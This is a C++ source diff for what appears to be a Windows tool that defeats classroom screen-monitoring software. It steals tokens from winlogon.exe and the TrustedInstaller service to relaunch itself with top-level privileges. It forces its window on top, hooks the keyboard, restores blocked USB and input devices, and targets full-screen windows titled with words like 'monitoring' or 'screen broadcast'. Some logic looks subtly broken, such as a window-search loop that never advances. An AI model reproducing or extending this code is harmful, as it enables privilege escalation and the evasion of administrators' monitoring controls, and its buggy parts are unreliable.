+        pCreateProcessAsUserW = (PFN_CreateProcessAsUserW)GetProcAddress(hAdvApi32, "CreateProcessAsUserW");
+        
+        initialized = true;
+        return true;
+    }
+    
+    static bool CreateProcessWithToken(
+        HANDLE hToken,
+        DWORD dwLogonFlags,
+        LPCWSTR lpApplicationName,
+        LPWSTR lpCommandLine,
+        DWORD dwCreationFlags,
+        LPVOID lpEnvironment,
+        LPCWSTR lpCurrentDirectory,
+        LPSTARTUPINFOW lpStartupInfo,
+        LPPROCESS_INFORMATION lpProcessInfo) {
+        
+        Initialize();
+        
+        if (pCreateProcessWithTokenW) {
+            if (pCreateProcessWithTokenW(hToken, dwLogonFlags, lpApplicationName, 
+                lpCommandLine, dwCreationFlags, lpEnvironment, lpCurrentDirectory, 
+                lpStartupInfo, lpProcessInfo)) {
+                return true;
+            }
+        }
+        
+        if (pCreateProcessAsUserW && hToken) {
+            HANDLE hDupToken = nullptr;
+            DWORD dwSessionId = 0;
+            DWORD tokenInfoLength = sizeof(DWORD);
+            
+            if (GetTokenInformation(hToken, TokenSessionId, &dwSessionId, sizeof(dwSessionId), &tokenInfoLength)) {
+                SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), nullptr, FALSE };
+                
+                if (DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, &sa, SecurityImpersonation, TokenImpersonation, &hDupToken)) {
+                    if (SetTokenInformation(hDupToken, TokenSessionId, &dwSessionId, sizeof(dwSessionId))) {
+                        BOOL result = pCreateProcessAsUserW(hDupToken, lpApplicationName, lpCommandLine,
+                            nullptr, nullptr, FALSE, dwCreationFlags, lpEnvironment, lpCurrentDirectory,
+                            lpStartupInfo, lpProcessInfo);
+                        CloseHandle(hDupToken);
+                        return result;
+                    }
+                    CloseHandle(hDupToken);
+                }
+            }
+        }
+        
+        return false;
+    }
+    
+    static void Cleanup() {
+        if (hAdvApi32) {
+            FreeLibrary(hAdvApi32);
+            hAdvApi32 = nullptr;
+        }
+        initialized = false;
+    }
+};
+
+HMODULE AdvancedProcessCreator::hAdvApi32 = nullptr;
+PFN_CreateProcessWithTokenW AdvancedProcessCreator::pCreateProcessWithTokenW = nullptr;
+PFN_CreateProcessAsUserW AdvancedProcessCreator::pCreateProcessAsUserW = nullptr;
+bool AdvancedProcessCreator::initialized = false;
+
+// 使用WTS API获取SYSTEM令牌（跨会话方案）
+bool GetSystemTokenUsingWTS(HANDLE* phToken) {
+    if (!WTSHelper::Initialize()) {
+        return false;
+    }
+    
+    HANDLE hUserToken = nullptr;
+    if (!WTSHelper::GetUserToken(&hUserToken)) {
+        return false;
+    }
+    
+    HandlePtr hUserTokenPtr(hUserToken);
+    HandlePtr hTokenDup(nullptr);
+    HANDLE rawDupToken;
+    SECURITY_ATTRIBUTES tokenAttributes = { 0 };
+    tokenAttributes.nLength = sizeof(SECURITY_ATTRIBUTES);
+    tokenAttributes.lpSecurityDescriptor = nullptr;
+    tokenAttributes.bInheritHandle = FALSE;
+    
+    if (!DuplicateTokenEx(hUserTokenPtr.get(), MAXIMUM_ALLOWED, &tokenAttributes,
+        SecurityImpersonation, TokenImpersonation, &rawDupToken)) {
+        return false;
+    }
+    
+    hTokenDup.reset(rawDupToken);
+    
+    DWORD dwSessionId = 0;
+    DWORD tokenInfoLength = sizeof(DWORD);
+    
+    if (GetTokenInformation(hTokenDup.get(), TokenSessionId, &dwSessionId, sizeof(dwSessionId), &tokenInfoLength)) {
+        HANDLE hSystemToken = nullptr;
+        if (DuplicateTokenEx(hTokenDup.get(), MAXIMUM_ALLOWED, &tokenAttributes,
+            SecurityImpersonation, TokenPrimary, &hSystemToken)) {
+            SetTokenInformation(hSystemToken, TokenSessionId, &dwSessionId, sizeof(dwSessionId));
+            *phToken = hSystemToken;
+            return true;
+        }
+    }
+    
+    return false;
+}
+
+// 使用WTS API模拟SYSTEM用户
+void ImpersonateSystemUsingWTS() {
+    HANDLE hSystemToken = nullptr;
+    
+    if (!GetSystemTokenUsingWTS(&hSystemToken)) {
+        throw WindowsException("Failed to get SYSTEM token using WTS API");
+    }
+    
+    HandlePtr hToken(hSystemToken);
+    
+    if (!ImpersonateLoggedOnUser(hToken.get())) {
+        throw WindowsException("ImpersonateLoggedOnUser failed (WTS API)");
+    }
+}
+
+// 使用winlogon.exe的备用方案
+void ImpersonateSystemUsingWinlogon() {
+    auto systemPid = GetProcessIdByName(L"winlogon.exe");
+    
+    HandlePtr hSystemProcess(OpenProcess(
+        PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION,
+        FALSE,
+        systemPid));
+    
+    if (!hSystemProcess) {
+        throw WindowsException("OpenProcess failed (winlogon.exe)");
+    }
+    
+    HandlePtr hSystemToken(nullptr);
+    HANDLE rawSystemToken;
+    if (!OpenProcessToken(
+        hSystemProcess.get(),
+        MAXIMUM_ALLOWED,
+        &rawSystemToken)) {
+        throw WindowsException("OpenProcessToken failed (winlogon.exe)");
+    }
+    hSystemToken.reset(rawSystemToken);
+    
+    HandlePtr hDupToken(nullptr);
+    HANDLE rawDupToken;
+    SECURITY_ATTRIBUTES tokenAttributes = { 0 };
+    tokenAttributes.nLength = sizeof(SECURITY_ATTRIBUTES);
+    tokenAttributes.lpSecurityDescriptor = nullptr;
+    tokenAttributes.bInheritHandle = FALSE;
+    
+    if (!DuplicateTokenEx(
+        hSystemToken.get(),
+        MAXIMUM_ALLOWED,
+        &tokenAttributes,
+        SecurityImpersonation,
+        TokenImpersonation,
+        &rawDupToken)) {
+        throw WindowsException("DuplicateTokenEx failed (winlogon.exe)");
+    }
+    hDupToken.reset(rawDupToken);
+    
+    if (!ImpersonateLoggedOnUser(hDupToken.get())) {
+        throw WindowsException("ImpersonateLoggedOnUser failed");
+    }
+}
+
+// 统一的ImpersonateSystem函数，自动选择最佳方法
+void ImpersonateSystem() {
+    if (WTSHelper::IsAvailable() && IsWindows7OrLater()) {
+        try {
+            ImpersonateSystemUsingWTS();
+            return;
+        }
+        catch (const WindowsException&) {
+        }
+    }
+    
+    ImpersonateSystemUsingWinlogon();
+}
+
+DWORD StartTrustedInstallerService() {
+    ServiceHandlePtr hSCManager(OpenSCManagerW(
+        nullptr,
+        SERVICES_ACTIVE_DATABASE,
+        GENERIC_EXECUTE));
+
+    if (!hSCManager) {
+        throw WindowsException("OpenSCManager failed");
+    }
+
+    ServiceHandlePtr hService(OpenServiceW(
+        hSCManager.get(),
+        L"TrustedInstaller",
+        GENERIC_READ | GENERIC_EXECUTE));
+
+    if (!hService) {
+        throw WindowsException("OpenService failed");
+    }
+
+    SERVICE_STATUS_PROCESS statusBuffer = { 0 };
+    DWORD bytesNeeded = 0;
+
+    if (!QueryServiceStatusEx(
+        hService.get(),
+        SC_STATUS_PROCESS_INFO,
+        reinterpret_cast<LPBYTE>(&statusBuffer),
+        sizeof(SERVICE_STATUS_PROCESS),
+        &bytesNeeded)) {
+        throw WindowsException("QueryServiceStatusEx failed");
+    }
+
+    // 如果服务已停止，则启动它
+    if (statusBuffer.dwCurrentState == SERVICE_STOPPED) {
+        if (!StartServiceW(hService.get(), 0, nullptr)) {
+            throw WindowsException("StartService failed");
+        }
+    }
+
+    // 等待服务进入运行状态
+    const int maxWaitTime = 30000; // 30秒超时
+    const int waitInterval = 100;  // 每次等待100ms
+    int totalWaited = 0;
+
+    while (totalWaited < maxWaitTime) {
+        if (!QueryServiceStatusEx(
+            hService.get(),
+            SC_STATUS_PROCESS_INFO,
+            reinterpret_cast<LPBYTE>(&statusBuffer),
+            sizeof(SERVICE_STATUS_PROCESS),
+            &bytesNeeded)) {
+            throw WindowsException("QueryServiceStatusEx failed");
+        }
+
+        if (statusBuffer.dwCurrentState == SERVICE_RUNNING) {
+            return statusBuffer.dwProcessId;
+        }
+
+        if (statusBuffer.dwCurrentState == SERVICE_STOPPED) {
+            throw std::runtime_error("TrustedInstaller service stopped unexpectedly");
+        }
+
+        Sleep(waitInterval);
+        totalWaited += waitInterval;
+    }
+
+    throw std::runtime_error("Timeout waiting for TrustedInstaller service to start");
+}
+
+bool IsRunningAsTrustedInstaller() {
+    // 检查当前进程是否已经以TrustedInstaller权限运行
+    HandlePtr hToken(nullptr);
+    HANDLE rawToken;
+
+    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &rawToken)) {
+        return false;
+    }
+    hToken.reset(rawToken);
+
+    // 获取令牌信息
+    DWORD tokenInfoLength = 0;
+    GetTokenInformation(hToken.get(), TokenUser, nullptr, 0, &tokenInfoLength);
+    if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
+        return false;
+    }
+
+    std::vector<BYTE> tokenUserBuffer(tokenInfoLength);
+    if (!GetTokenInformation(hToken.get(), TokenUser, tokenUserBuffer.data(), tokenInfoLength, &tokenInfoLength)) {
+        return false;
+    }
+
+    TOKEN_USER* tokenUser = reinterpret_cast<TOKEN_USER*>(tokenUserBuffer.data());
+
+    // 检查是否为SYSTEM账户
+    WCHAR systemSid[SECURITY_MAX_SID_SIZE];
+    DWORD systemSidSize = sizeof(systemSid);
+    if (!CreateWellKnownSid(WinLocalSystemSid, nullptr, systemSid, &systemSidSize)) {
+        return false;
+    }
+
+    return EqualSid(tokenUser->User.Sid, systemSid);
+}
+
+std::wstring GetCommandLineArgsString();
+
+void RunAsTrustedInstaller() {
+    try {
+        // 启用必要特权
+        EnablePrivilege(SE_DEBUG_NAME);
+        EnablePrivilege(SE_IMPERSONATE_NAME);
+
+        // 模拟SYSTEM用户
+        ImpersonateSystem();
+
+        // 启动TrustedInstaller服务并获取其PID
+        auto pid = StartTrustedInstallerService();
+
+        // 获取TrustedInstaller进程句柄
+        HandlePtr hTIProcess(OpenProcess(
+            PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION,
+            FALSE,
+            pid));
+
+        if (!hTIProcess) {
+            throw WindowsException("OpenProcess failed (TrustedInstaller.exe)");
+        }
+
+        // 获取TrustedInstaller进程令牌
+        HandlePtr hTIToken(nullptr);
+        HANDLE rawTIToken;
+        if (!OpenProcessToken(
+            hTIProcess.get(),
+            MAXIMUM_ALLOWED,
+            &rawTIToken)) {
+            throw WindowsException("OpenProcessToken failed (TrustedInstaller.exe)");
+        }
+        hTIToken.reset(rawTIToken);
+
+        // 复制令牌
+        HandlePtr hDupToken(nullptr);
+        HANDLE rawDupToken;
+        SECURITY_ATTRIBUTES tokenAttributes = { 0 };
+        tokenAttributes.nLength = sizeof(SECURITY_ATTRIBUTES);
+        tokenAttributes.lpSecurityDescriptor = nullptr;
+        tokenAttributes.bInheritHandle = FALSE;
+
+        if (!DuplicateTokenEx(
+            hTIToken.get(),
+            MAXIMUM_ALLOWED,
+            &tokenAttributes,
+            SecurityImpersonation,
+            TokenImpersonation,
+            &rawDupToken)) {
+            throw WindowsException("DuplicateTokenEx failed (TrustedInstaller.exe)");
+        }
+        hDupToken.reset(rawDupToken);
+
+        // 修复: 设置令牌的会话ID为当前用户会话ID，解决Edge等程序启动后被最小化的问题
+        // TrustedInstaller进程的令牌会话ID为0，而当前用户会话通常为1
+        DWORD dwCurrentSessionId = 0;
+        DWORD dwCurrentProcessId = GetCurrentProcessId();
+        
+        // 使用ProcessIdToSessionId获取当前进程的会话ID
+        if (ProcessIdToSessionId(dwCurrentProcessId, &dwCurrentSessionId)) {
+            // 成功获取到当前进程的会话ID，设置到令牌
+            if (!SetTokenInformation(hDupToken.get(), TokenSessionId, &dwCurrentSessionId, sizeof(dwCurrentSessionId))) {
+                std::cerr << "警告: 设置令牌会话ID失败，Edge等程序可能无法正常显示" << std::endl;
+            }
+        } else {
+            std::cerr << "警告: 获取当前会话ID失败，Edge等程序可能无法正常显示" << std::endl;
+        }
+
+        // 获取当前可执行文件路径
+        WCHAR currentExePath[MAX_PATH];
+        if (!GetModuleFileNameW(nullptr, currentExePath, MAX_PATH)) {
+            throw WindowsException("GetModuleFileName failed");
+        }
+
+        // 构建命令行参数
+        // [修复] 添加 --ti-child 标记，让子进程跳过单例互斥锁检查
+        std::wstring commandLine = L"\"" + std::wstring(currentExePath) + L"\" --ti-child";
+
+        // 获取当前进程的命令行参数
+        LPWSTR cmdLine = GetCommandLineW();
+        if (cmdLine) {
+            // 跳过可执行文件路径部分
+            if (cmdLine[0] == L'"') {
+                // 可执行文件路径被引号包围
+                wchar_t* endQuote = wcschr(cmdLine + 1, L'"');
+                if (endQuote) {
+                    commandLine += L" " + std::wstring(endQuote + 1);
+                }
+            }
+            else {
+                // 可执行文件路径没有引号
+                wchar_t* space = wcschr(cmdLine, L' ');
+                if (space) {
+                    commandLine += L" " + std::wstring(space + 1);
+                }
+            }
+        }
+
+        // 创建进程
+        STARTUPINFOW startupInfo = { 0 };
+        startupInfo.cb = sizeof(STARTUPINFOW);
+        startupInfo.lpDesktop = const_cast<LPWSTR>(L"Winsta0\\Default");
+
+        PROCESS_INFORMATION processInfo = { 0 };
+
+        DWORD dwLogonFlags = IsWindows7OrLater() ? LOGON_WITH_PROFILE : 0;
+        
+        if (!AdvancedProcessCreator::CreateProcessWithToken(
+            hDupToken.get(),
+            dwLogonFlags,
+            nullptr,
+            const_cast<LPWSTR>(commandLine.c_str()),
+            CREATE_UNICODE_ENVIRONMENT,
+            nullptr,
+            nullptr,
+            &startupInfo,
+            &processInfo)) {
+            throw WindowsException("CreateProcessWithToken failed (using AdvancedProcessCreator)");
+        }
+
+        // 关闭进程和线程句柄
+        CloseHandle(processInfo.hProcess);
+        CloseHandle(processInfo.hThread);
+
+        // 退出当前进程
+        exit(0);
+    }
+    catch (const std::exception& e) {
+        std::cerr << "提升到TrustedInstaller权限失败: " << e.what() << std::endl;
+        throw;
+    }
+}
+
+std::wstring GetCommandLineArgsString() {
+    LPWSTR cmdLine = GetCommandLineW();
+    std::wstring cmd(cmdLine);
+
+    std::wstring::size_type pos = cmd.find(L"\" --service-run");
+    if (pos != std::wstring::npos) {
+        return cmd.substr(pos + 2);
+    }
+
+    pos = cmd.find(L"--service-run");
+    if (pos != std::wstring::npos) {
+        std::wstring::size_type spacePos = cmd.find(L' ', pos);
+        if (spacePos != std::wstring::npos) {
+            return cmd.substr(spacePos + 1);
+        }
+    }
+
+    return L"";
+}
+
+std::vector<std::string> splitString(const std::string& input, char delimiter) {
+    std::vector<std::string> result;
+    std::stringstream ss(input);
+    std::string item;
+
+    while (std::getline(ss, item, delimiter)) {
+        // 去除前后空格
+        item.erase(0, item.find_first_not_of(" \t\n\r\f\v"));
+        item.erase(item.find_last_not_of(" \t\n\r\f\v") + 1);
+
+        if (!item.empty()) {
+            result.push_back(item);
+        }
+    }
+
+    return result;
+}
+
+// 全局变量用于窗口置顶功能
+static bool g_alwaysOnTopEnabled = false;
+static bool g_hiddenMenuUnlocked = false;
+static std::thread g_alwaysOnTopThread;
+static HWND g_targetTopmostWindow = NULL;
+static std::wstring g_targetWindowClass;
+static std::wstring g_targetWindowTitle;
+static WINDOWPLACEMENT g_originalPlacement = { sizeof(WINDOWPLACEMENT) };
+static bool g_hasOriginalPlacement = false;
+
+// ===== 强制置顶增强：WinEvent Hook（实时监控窗口事件，零延迟响应）=====
+static HWINEVENTHOOK g_hWinEventHookForeground = NULL;  // 前台窗口切换
+static HWINEVENTHOOK g_hWinEventHookMinimize = NULL;    // 窗口最小化/恢复
+static HWINEVENTHOOK g_hWinEventHookDestroy = NULL;     // 窗口销毁
+static HWINEVENTHOOK g_hWinEventHookCreate = NULL;      // 窗口创建/显示
+
+// ===== 强制置顶增强：窗口子类化（拦截消息级阻止失去置顶）=====
+static WNDPROC g_originalTargetWndProc = NULL;   // 原始窗口过程
+static HWND g_subclassedHwnd = NULL;             // 当前被子类化的窗口
+
+// ===== 强制置顶增强：战斗模式状态（高频率反击）=====
+static volatile LONG g_topmostFightMode = 0;     // 0=正常模式 1=战斗模式
+static DWORD g_lastTopmostFightTime = 0;         // 上次触发战斗模式的时间戳
+
+// ===== 强制置顶增强：键盘钩子（阻止其他程序模拟输入）=====
+static HHOOK g_hKeyboardHook = NULL;
+static std::thread g_keyboardHookThread;
+static bool g_keyboardHookRunning = false;
+
+// 全局变量用于最小化最上方窗口功能
+static bool g_minimizeTopWindowEnabled = false;
+static std::thread g_minimizeTopWindowThread;
+
+// 全局变量用于虚拟桌面防护
+static HDESK g_originalDesktop = NULL;
+static HDESK g_currentDesktop = NULL;
+static DWORD g_lastDesktopCheckTime = 0;
+
+static DWORD g_lastForegroundThreadId = 0;
+static DWORD g_lastInputBindTime = 0;
+
+static DWORD GetThreadIdFromWindow(HWND hwnd) {
+    if (hwnd == NULL) return 0;
+    DWORD threadId = GetWindowThreadProcessId(hwnd, NULL);
+    return threadId;
+}
+
+static bool IsThreadInputAttached(DWORD threadId1, DWORD threadId2) {
+    if (threadId1 == 0 || threadId2 == 0 || threadId1 == threadId2) return false;
+    return AttachThreadInput(threadId1, threadId2, TRUE);
+}
+
+static void ReleaseThreadInput(DWORD threadId1, DWORD threadId2) {
+    if (threadId1 != 0 && threadId2 != 0 && threadId1 != threadId2) {
+        AttachThreadInput(threadId1, threadId2, FALSE);
+    }
+}
+
+static void ReleaseAllInputBindings(DWORD targetThreadId) {
+    if (targetThreadId == 0) return;
+
+    DWORD foregroundThreadId = GetThreadIdFromWindow(GetForegroundWindow());
+    if (foregroundThreadId == 0) return;
+
+    if (foregroundThreadId != targetThreadId) {
+        ReleaseThreadInput(foregroundThreadId, targetThreadId);
+    }
+
+    HWND hwnd = GetForegroundWindow();
+    if (hwnd != NULL) {
+        HWND hPrev = GetWindow(hwnd, GW_HWNDLAST);
+        while (hPrev != NULL) {
+            if (hPrev != hwnd) {
+                DWORD prevThreadId = GetThreadIdFromWindow(hPrev);
+                if (prevThreadId != 0 && prevThreadId != targetThreadId) {
+                    ReleaseThreadInput(prevThreadId, targetThreadId);
+                }
+            }
+            hPrev = GetWindow(hPrev, GW_HWNDNEXT);
+        }
+    }
+}
+
+static bool ReleaseFocusFromOtherThreads(HWND targetHwnd) {
+    if (targetHwnd == NULL || !IsWindow(targetHwnd)) return false;
+
+    DWORD targetThreadId = GetThreadIdFromWindow(targetHwnd);
+    if (targetThreadId == 0) return false;
+
+    HWND foregroundHwnd = GetForegroundWindow();
+    if (foregroundHwnd == NULL || foregroundHwnd == targetHwnd) return true;
+
+    DWORD foregroundThreadId = GetThreadIdFromWindow(foregroundHwnd);
+    if (foregroundThreadId == 0) return false;
+
+    if (foregroundThreadId != targetThreadId) {
+        ReleaseThreadInput(foregroundThreadId, targetThreadId);
+    }
+
+    HWND hwnd = GetWindow(GetDesktopWindow(), GW_CHILD);
+    while (hwnd != NULL) {
+        if (hwnd != targetHwnd && hwnd != foregroundHwnd) {
+            DWORD threadId = GetThreadIdFromWindow(hwnd);
+            if (threadId != 0 && threadId != targetThreadId) {
+                ReleaseThreadInput(threadId, targetThreadId);
+            }
+        }
+        hwnd = GetWindow(hwnd, GW_HWNDNEXT);
+    }
+
+    return true;
+}
+
+static void EnsureFocusOnTarget(HWND targetHwnd) {
+    if (targetHwnd == NULL || !IsWindow(targetHwnd)) return;
+
+    DWORD targetThreadId = GetThreadIdFromWindow(targetHwnd);
+    if (targetThreadId == 0) return;
+
+    DWORD currentTime = GetTickCount();
+    if (currentTime - g_lastInputBindTime < 100) {
+        return;
+    }
+    g_lastInputBindTime = currentTime;
+
+    ReleaseFocusFromOtherThreads(targetHwnd);
+
+    if (g_lastForegroundThreadId != targetThreadId && targetThreadId != 0) {
+        g_lastForegroundThreadId = targetThreadId;
+    }
+}
+
+static bool IsWindowInteractive(HWND hwnd) {
+    if (hwnd == NULL || !IsWindow(hwnd)) return false;
+
+    if (!IsWindowVisible(hwnd)) return false;
+
+    if (IsIconic(hwnd) && !IsZoomed(hwnd)) return false;
+
+    LONG exStyle = GetWindowLong(hwnd, GWL_EXSTYLE);
+    if (exStyle & WS_EX_TOOLWINDOW) return false;
+
+    if (exStyle & WS_EX_LAYERED) {
+        COLORREF crKey = 0;
+        BYTE alpha = 0;
+        DWORD flags = 0;
+        BOOL layered = GetLayeredWindowAttributes(hwnd, &crKey, &alpha, &flags);
+        if (layered && alpha == 0) return false;
+    }
+
+    return true;
+}
+
+static HWND FindInteractiveWindow(HWND startHwnd) {
+    if (startHwnd == NULL || !IsWindow(startHwnd)) return NULL;
+
+    if (IsWindowInteractive(startHwnd)) {
+        return startHwnd;
+    }
+
+    HWND child = FindWindowEx(startHwnd, NULL, NULL, NULL);
+    while (child != NULL) {
+        HWND result = FindInteractiveWindow(child);
+        if (result != NULL) return result;
+        child = FindWindowEx(startHwnd, child, NULL, NULL);
+    }
+
+    return NULL;
+}
+
+static void ResetWindowFocus(HWND targetHwnd) {
+    if (targetHwnd == NULL || !IsWindow(targetHwnd)) return;
+
+    if (!IsWindowInteractive(targetHwnd)) {
+        HWND interactiveHwnd = FindInteractiveWindow(targetHwnd);
+        if (interactiveHwnd != NULL) {
+            targetHwnd = interactiveHwnd;
+        }
+    }
+
+    DWORD targetThreadId = GetThreadIdFromWindow(targetHwnd);
+    if (targetThreadId == 0) return;
+
+    ReleaseFocusFromOtherThreads(targetHwnd);
+}
+
+static void RestoreFocusToTarget(HWND targetHwnd) {
+    if (targetHwnd == NULL || !IsWindow(targetHwnd)) return;
+
+    DWORD targetThreadId = GetThreadIdFromWindow(targetHwnd);
+    if (targetThreadId == 0) return;
+
+    HWND currentForeground = GetForegroundWindow();
+    if (currentForeground == targetHwnd) return;
+
+    DWORD currentForegroundThread = GetThreadIdFromWindow(currentForeground);
+    if (currentForegroundThread == 0) return;
+
+    if (currentForegroundThread != targetThreadId) {
+        AttachThreadInput(targetThreadId, currentForegroundThread, TRUE);
+
+        SetWindowPos(targetHwnd, HWND_TOPMOST, 0, 0, 0, 0, 
+            SWP_NOACTIVATE | SWP_NOMOVE | SWP_NOSIZE);
+
+        AttachThreadInput(targetThreadId, currentForegroundThread, FALSE);
+    }
+}
+
+static DWORD g_lastReleaseTime = 0;
+static const DWORD RELEASE_INTERVAL = 2;
+
+static void ContinuousReleaseFocus(HWND targetHwnd) {
+    DWORD currentTime = GetTickCount();
+    if (currentTime - g_lastReleaseTime < RELEASE_INTERVAL) {
+        return;
+    }
+    g_lastReleaseTime = currentTime;
+
+    if (targetHwnd == NULL || !IsWindow(targetHwnd)) return;
+
+    DWORD targetThreadId = GetThreadIdFromWindow(targetHwnd);
+    if (targetThreadId == 0) return;
+
+    HWND hDesktop = GetDesktopWindow();
+    HWND hWnd = GetWindow(hDesktop, GW_CHILD);
+    while (hWnd != NULL) {
+        if (hWnd != targetHwnd) {
+            DWORD threadId = GetThreadIdFromWindow(hWnd);
+            if (threadId != 0 && threadId != targetThreadId) {
+                AttachThreadInput(targetThreadId, threadId, FALSE);
+            }
+        }
+        hWnd = GetWindow(hWnd, GW_HWNDNEXT);
+    }
+
+    HWND hForeground = GetForegroundWindow();
+    if (hForeground != NULL && hForeground != targetHwnd) {
+        DWORD foregroundThreadId = GetThreadIdFromWindow(hForeground);
+        if (foregroundThreadId != 0 && foregroundThreadId != targetThreadId) {
+            AttachThreadInput(targetThreadId, foregroundThreadId, FALSE);
+        }
+    }
+}
+
+// 窗口置顶线程函数
+// USB存储恢复功能（独立函数，在ProcessTerminator类之后实现）
+bool RestoreUSBStorageDevices();
+
+bool RestoreInputDevices();
+
+bool RemoveFullscreenOverlays();
+
+// 最小化覆盖窗口
+void MinimizeOverlayWindows();
+
+// 检测并恢复F11全屏窗口的函数声明
+void DetectAndRestoreFullscreenWindows();
+
+// 辅助函数：检测单个窗口是否为全屏窗口
+bool IsFullscreenWindow(HWND hwnd) {
+    if (!hwnd || !IsWindow(hwnd)) return false;
+    if (!IsWindowVisible(hwnd)) return false;
+    
+    RECT rect;
+    if (!GetWindowRect(hwnd, &rect)) return false;
+    
+    int winW = rect.right - rect.left;
+    int winH = rect.bottom - rect.top;
+    if (winW <= 0 || winH <= 0) return false;
+    
+    int screenW = GetSystemMetrics(SM_CXSCREEN);
+    int screenH = GetSystemMetrics(SM_CYSCREEN);
+    
+    // 检测窗口尺寸是否接近或等于屏幕尺寸（95%）
+    if (winW < screenW * 0.95f || winH < screenH * 0.95f) {
+        return false;
+    }
+    
+    // 获取窗口样式
+    LONG style = GetWindowLongW(hwnd, GWL_STYLE);
+    LONG exStyle = GetWindowLongW(hwnd, GWL_EXSTYLE);
+    
+    // 获取窗口类名
+    wchar_t className[256] = {};
+    GetClassNameW(hwnd, className, 256);
+    
+    // 获取窗口标题
+    wchar_t windowTitle[256] = {};
+    GetWindowTextW(hwnd, windowTitle, 256);
+    
+    // 检测是否是Explorer窗口（F11全屏）
+    bool isExplorer = wcsstr(className, L"CabinetWClass") != nullptr ||
+                    wcsstr(className, L"ExploreWClass") != nullptr;
+    
+    // 检测是否没有标题栏
+    bool noCaption = (style & WS_CAPTION) == 0;
+    
+    // 检测是否是分层窗口（可能是DWM覆盖）
+    bool isLayered = (exStyle & WS_EX_LAYERED) != 0;
+    
+    // 检测是否是顶级窗口
+    bool isTopLevel = (exStyle & WS_EX_TOPMOST) != 0;
+    
+    // 检测是否没有边框
+    bool noBorder = (style & WS_BORDER) == 0;
+    
+    // 检测是否是弹出窗口
+    bool isPopup = (style & WS_POPUP) != 0;
+    
+    // 检测可疑类名
+    bool suspiciousClass = wcsstr(className, L"DXGI") != nullptr ||
+                         wcsstr(className, L"D3D") != nullptr ||
+                         wcsstr(className, L"Overlay") != nullptr ||
+                         wcsstr(className, L"Hook") != nullptr ||
+                         wcsstr(className, L"Fullscreen") != nullptr ||
+                         wcsstr(className, L"Monitor") != nullptr;
+    
+    // 检测可疑标题
+    bool suspiciousTitle = wcsstr(windowTitle, L"教室") != nullptr ||
+                        wcsstr(windowTitle, L"监控") != nullptr ||
+                        wcsstr(windowTitle, L"控制") != nullptr ||
+                        wcsstr(windowTitle, L"屏幕广播") != nullptr;
+    
+    // 判断是否为全屏窗口的条件
+    // 1. Explorer类名 + 接近全屏尺寸
+    // 2. 无标题栏 + 无边框 + 接近全屏尺寸
+    // 3. 可疑类名 + 可疑标题 + 接近全屏尺寸
+    // 4. 分层窗口 + 可疑标题 + 接近全屏尺寸
+    bool isFullscreen = false;
+    
+    if (isExplorer && winW >= screenW * 0.95f && winH >= screenH * 0.95f) {
+        isFullscreen = true;
+    }
+    else if (noCaption && noBorder && winW >= screenW * 0.95f && winH >= screenH * 0.95f) {
+        isFullscreen = true;
+    }
+    else if ((suspiciousClass || suspiciousTitle) && winW >= screenW * 0.95f && winH >= screenH * 0.95f) {
+        isFullscreen = true;
+    }
+    else if (isLayered && suspiciousTitle && winW >= screenW * 0.95f && winH >= screenH * 0.95f) {
+        isFullscreen = true;
+    }
+    else if (isPopup && winW >= screenW * 0.95f && winH >= screenH * 0.95f && suspiciousTitle) {
+        isFullscreen = true;
+    }
+    
+    return isFullscreen;
+}
+
+// 全局变量存储本程序窗口句柄
+static std::vector<HWND> g_MyWindows;
+static std::mutex g_MyWindowsMutex; // 用于保护窗口句柄列表的互斥锁
+static DWORD g_LastMyWindowsUpdateTime = 0; // 上次更新窗口句柄列表的时间
+
+// 增强的获取本程序窗口句柄函数（防止其他程序干扰）
+static void GetMyWindowsEnhanced() {
+    // 使用互斥锁保护窗口句柄列表
+    std::lock_guard<std::mutex> lock(g_MyWindowsMutex);
+    
+    DWORD currentTime = GetTickCount();
+    
+    // 每1000ms才重新枚举窗口，避免频繁枚举
+    if (currentTime - g_LastMyWindowsUpdateTime < 1000 && !g_MyWindows.empty()) {
+        return;
+    }
+    
+    g_LastMyWindowsUpdateTime = currentTime;
+    
+    // 临时存储旧窗口句柄
+    std::vector<HWND> oldWindows = g_MyWindows;
+    
+    // 清空并重新获取窗口句柄
+    g_MyWindows.clear();
+    
+    // 方法1：通过进程ID枚举窗口
+    EnumWindows([](HWND hwnd, LPARAM) -> BOOL {
+        if (!hwnd || !IsWindow(hwnd)) return TRUE;
+        
+        DWORD pid;
+        GetWindowThreadProcessId(hwnd, &pid);
+        if (pid == GetCurrentProcessId()) {
+            // 验证窗口是否仍然有效
+            if (IsWindow(hwnd) && IsWindowVisible(hwnd)) {
+                g_MyWindows.push_back(hwnd);
+            }
+        }
+        return TRUE;
+    }, 0);
+    
+    // 方法2：通过窗口类名查找（补充可能遗漏的窗口）
+    wchar_t exePath[MAX_PATH];
+    if (GetModuleFileNameW(NULL, exePath, MAX_PATH)) {
+        wchar_t exeName[MAX_PATH];
+        wchar_t drive[_MAX_DRIVE];
+        wchar_t dir[_MAX_DIR];
+        wchar_t ext[_MAX_EXT];
+        _wsplitpath_s(exePath, drive, dir, exeName, ext);
+        
+        // 移除.exe扩展名
+        wchar_t* dot = wcsrchr(exeName, L'.');
+        if (dot) {
+            *dot = L'\0';
+        }
+        
+        // 查找所有匹配的窗口
+        HWND hwnd = NULL;
+        while ((hwnd = FindWindowW(exeName, NULL)) != NULL) {
+            DWORD pid;
+            GetWindowThreadProcessId(hwnd, &pid);
+            if (pid == GetCurrentProcessId()) {
+                // 检查是否已经在列表中
+                bool alreadyExists = false;
+                for (HWND existingHwnd : g_MyWindows) {
+                    if (existingHwnd == hwnd) {
+                        alreadyExists = true;
+                        break;
+                    }
+                }
+                
+                if (!alreadyExists && IsWindow(hwnd)) {
+                    g_MyWindows.push_back(hwnd);
+                }
+            }
+        }
+    }
+    
+    // 去重窗口句柄
+    std::sort(g_MyWindows.begin(), g_MyWindows.end());
+    g_MyWindows.erase(std::unique(g_MyWindows.begin(), g_MyWindows.end()), g_MyWindows.end());
+    
+    // 验证所有窗口句柄仍然有效
+    for (auto it = g_MyWindows.begin(); it != g_MyWindows.end(); ) {
+        if (!IsWindow(*it)) {
+            it = g_MyWindows.erase(it);
+        } else {
+            ++it;
+        }
+    }
+}
+
